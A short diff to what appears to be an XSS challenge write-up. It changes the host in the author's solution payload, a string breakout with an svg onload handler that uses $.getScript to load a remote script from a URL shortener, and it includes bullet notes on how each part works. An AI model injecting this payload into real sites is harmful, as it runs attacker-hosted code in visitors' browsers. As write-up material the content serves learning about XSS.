@@ -87,7 +87,7 @@ In order to get around these challenges, I used the following facts:
 
 So my solution ended up being quite simple:
 
-`";//<svg onload="$.getScript('//snip.li/OwO')"/>`
+`";//<svg onload="$.getScript('//cutt.ly/wrqQHy3')"/>`
 
 - The `";//` comments out the XSS vector to prevent a syntax error
 - The svg onload uses `$.getScript` to retrieve an external script
